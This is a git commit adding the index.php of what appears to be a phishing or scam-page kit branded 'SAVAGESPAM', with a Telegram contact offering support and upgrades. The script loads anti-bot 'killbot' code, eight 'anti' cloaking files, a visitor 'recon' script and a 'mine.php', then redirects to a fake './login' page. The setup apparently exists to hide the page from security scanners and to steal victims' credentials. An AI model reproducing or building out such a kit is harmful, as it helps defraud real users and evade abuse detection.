dc9a182005a4f486864edbdefafc2598c4154d5f
nomotionlit <131481938+nomotionlit@users.noreply.github.com>
2023-04-28 13:12:36 +0000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,28 @@
+<?php
+/*
+
+░██████╗░█████╗░██╗░░░██╗░█████╗░░██████╗░███████╗░██████╗██████╗░░█████╗░███╗░░░███╗
+██╔════╝██╔══██╗██║░░░██║██╔══██╗██╔════╝░██╔════╝██╔════╝██╔══██╗██╔══██╗████╗░████║
+╚█████╗░███████║╚██╗░██╔╝███████║██║░░██╗░█████╗░░╚█████╗░██████╔╝███████║██╔████╔██║
+░╚═══██╗██╔══██║░╚████╔╝░██╔══██║██║░░╚██╗██╔══╝░░░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║
+██████╔╝██║░░██║░░╚██╔╝░░██║░░██║╚██████╔╝███████╗██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║
+╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚══════╝╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+
+Telegram : @savagespam
+Write Me If You Have Any Issues Or For Upgrade      */
+
+
+	require(__DIR__ . '/codead_prevent/include.php');
+	require_once(__DIR__ . '/killbot/code/include.php');
+	require 'anti/anti1.php';
+	require 'anti/anti2.php';
+	require 'anti/anti3.php';
+	require 'anti/anti4.php';
+	require 'anti/anti5.php';
+	require 'anti/anti6.php';
+	require 'anti/anti7.php';
+	require 'anti/anti8.php';
+    require 'anti/recon.php';
+    require './mine.php';
+	header("Location: ./login");
+?>
